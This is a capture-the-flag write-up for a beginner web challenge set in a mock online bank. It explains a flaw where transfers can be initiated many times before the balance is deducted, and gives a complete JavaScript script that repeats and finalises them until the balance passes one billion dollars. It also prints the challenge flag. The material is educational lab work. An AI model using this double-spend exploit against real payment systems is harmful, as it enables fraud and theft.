---
title: "Billionaire"
description: "RISC intro2web challenge 5"
pubDate: "Aug 27 2025"
heroImage: "/hero/index-money_Tom_678.webp"
tags: ["cyber", "php", "javascript", "ctf", "exploit"]
---

###### [Canonical > RISC](https://writeups.urisc.club/web/5_billionaire/)

## Challenge description

I wanna be a billionaire so f\*cking bad / Buy all of the things I never had

"Billionaire" - Travie McCoy ft Bruno Mars

---

## Approach

At `accounts.php` we see a banner that reads:

> Leftman Brothers Super Secret Club
>
> Locked — requires total balance in a single account of at least $1,000,000,000.00.

So we want to somehow get 1 Billion dollars in our account.

We can create a second checking account at `open_account.php`.

If we transfer some money from our first account to our second, we see that there are two steps to each transfer.

1. `initiate_transfer.php` has us choose the amount and where to send it.
2. `finalise_transfer.php` has us confirm the details.

Initiate transfer wont let us send more money than we have, but doesnt take the money out of our account, this means we can initiate multiple transfers and finalise them all afterwards.

Analysing the network tab in the browser dev tools we can see that:

- `initiate_transfer` needs an account id, account name, and amount. (and a description but we can omit it)
- `finalise_transfer` needs a transfer id (tid)

All of these details can be extracted from the HTML of prior steps.

So if we get our account details from `transfer.php`, initiate multiple transfers to `initiate_transfer`, get the transfer ids, and finalise them all at `finalise_transfer`, we should be able to increase our balance.

### Javascript implementation:

```javascript
const URL = "http://leftmanbrothers.ctf.urisc.club/netbank/";

async function get_accounts() {
	const transfer_page = await fetch(`${URL}transfer.php`);
	const transfer_html = await transfer_page.text();

	const regex = /"(\d+)">\s*((?:LB-)?\d+) — \$(-?[\d,.]+)/g;

	const accounts = [];

	let match;
	while ((match = regex.exec(transfer_html))) {
		accounts.push({
			id: match[1],
			name: match[2],
			balance: parseFloat(match[3].replaceAll(",", "")),
		});
	}

	return accounts;
}

async function post(url, params) {
	const response = await fetch(`${URL}${url}.php`, {
		headers: {
			"content-type": "application/x-www-form-urlencoded",
		},
		body: params,
		method: "POST",
	});

	return await response.text();
}

while (true) {
	const accounts = await get_accounts();

	// account with most money
	let from_account = accounts.reduce((prev, current) =>
		prev.balance > current.balance ? prev : current,
	);

	// any other account
	let to_account = accounts.find((account) => account !== from_account);

	console.log("Balance: " + from_account.balance);
	if (from_account.balance >= 1_000_000_000) {
		console.log("We're rich!");
		break;
	}

	let tids = [];
	// start transaction
	const params = `from_account=${from_account.id}&to_account=${to_account.name}&amount=${from_account.balance}`;
	for (let i = 0; i < 3; i++) {
		const html = await post("initiate_transfer", params);
		const match = html.match(/"tid" value="(\d+)"/);
		const tid = match[1];
		tids.push(tid);
	}

	// finalize transactions
	for (let i = 0; i < 3; i++) {
		const params = `tid=${tids[i]}`;
		await post("finalise_transfer", params);
	}
}
```

Returning to `accounts.php`, we can see the banner has changed:

> Congratulations, high roller. Your access is unlocked.
>
> Club Password: RISC{livin_the_luxury_lifestyle_fr_fb3c001ee2725c0c3f5e3a39059f75c6}

Our flag is:

```
RISC{livin_the_luxury_lifestyle_fr_fb3c001ee2725c0c3f5e3a39059f75c6}
```
